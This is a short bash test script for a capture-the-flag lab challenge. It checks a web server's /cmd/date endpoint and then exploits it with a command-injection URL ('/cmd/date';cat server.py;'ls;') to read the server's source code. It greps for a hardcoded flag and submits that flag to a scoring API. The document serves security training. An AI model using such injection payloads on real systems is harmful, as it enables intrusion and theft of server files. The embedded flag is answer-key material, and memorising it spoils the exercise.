#!/bin/bash

MATCH=`curl -s "172.20.0.30/" | \
       grep -o "See GET /cmd/date endpoint."`
if [[ "$MATCH" == "" ]]
then
    echo "Error - index.html does not contain /cmd/date mention"
    exit 1
fi

MATCH=`curl -s "172.20.0.30/cmd/date"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - /cmd/date endpoint does not return anything"
    exit 2
fi

MATCH=`curl -s "172.20.0.30/cmd/date';cat%20server.py;'ls;" | \
       grep -o "BSY{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - flag is not present in the server.py file or we failed to read it"
    exit 3
fi

# submit a flag in the submission server
RES=`curl -s 'http://172.20.0.3/api/challenges/submit' \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"challenge_id": "what_is_the_date", "task_id": "task1", "flag" : "BSY{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}"}'`

if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit the flag - $RES"
  exit 4
fi

echo "OK - tests passed"
